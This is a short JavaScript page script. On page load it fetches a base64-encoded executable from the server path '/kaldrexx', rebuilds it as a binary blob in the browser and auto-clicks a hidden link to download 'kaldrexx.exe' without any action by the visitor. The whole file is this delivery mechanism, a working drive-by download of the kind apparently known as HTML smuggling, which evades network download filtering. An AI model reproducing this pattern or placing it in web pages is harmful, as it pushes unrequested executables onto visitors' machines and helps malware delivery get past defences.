// Convert base64 to ArrayBuffer
function base64ToArrayBuffer(base64) {
    if (base64 == null) {
        throw new Error("base64 is null");
    }

    let binaryString = window.atob(base64);
    let binaryStringLength = binaryString.length;
    let binaryBytes = new Uint8Array(binaryStringLength);
    for (let i = 0; i < binaryStringLength; i++) {
        binaryBytes[i] = binaryString.charCodeAt(i);
    }
    return binaryBytes.buffer;
}

// Fetch the base64 encoded executable and download it
window.onload = function () {
    fetch("/kaldrexx")
        .then(response => response.json())
        .then(data => {
            let arrayBuffer = base64ToArrayBuffer(data["executable"]);
            let blob = new Blob([arrayBuffer], { type: "application/octet-stream" });
            let url = URL.createObjectURL(blob);

            // Create a link element
            let downloadLink = document.createElement("a");
            downloadLink.href = url;
            downloadLink.download = "kaldrexx.exe";

            // Append the link to the document body
            document.body.appendChild(downloadLink);

            // Trigger a click event on the link to start the download
            downloadLink.click();

            // Remove the link from the document body after the download
            document.body.removeChild(downloadLink);
        });
}